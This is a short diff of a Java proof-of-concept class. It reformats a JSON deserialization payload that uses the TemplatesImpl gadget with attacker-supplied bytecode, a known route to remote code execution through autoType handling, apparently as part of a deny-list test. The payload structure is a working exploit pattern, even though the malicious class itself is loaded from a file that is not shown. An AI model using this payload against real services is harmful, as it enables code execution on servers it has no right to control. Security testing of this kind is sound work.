@@ -36,8 +36,10 @@ public class Poc {
         String evilCode = readClass(evilClassPath);
         final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
         String text1 = "{\"@type\":\"" + NASTY_CLASS +
-                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
-                "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
+                "\",\"_bytecodes\":[\""+evilCode+"\"]," +
+                "'_name':'a.b'," +
+                "'_tfactory':{ }," +
+                "\"_outputProperties\":{ }}\n";
         System.out.println(text1);
         //String personStr = "{'name':"+text1+",'age':19}";
         //Person obj = JSON.parseObject(personStr, Person.class, config, Feature.SupportNonPublicField);
@@ -45,7 +47,9 @@ public class Poc {
         //assertEquals(Model.class, obj.getClass());
 
     }
+
     public static void main(String args[]){
+
         try {
             test_autoTypeDeny();
         } catch (Exception e) {
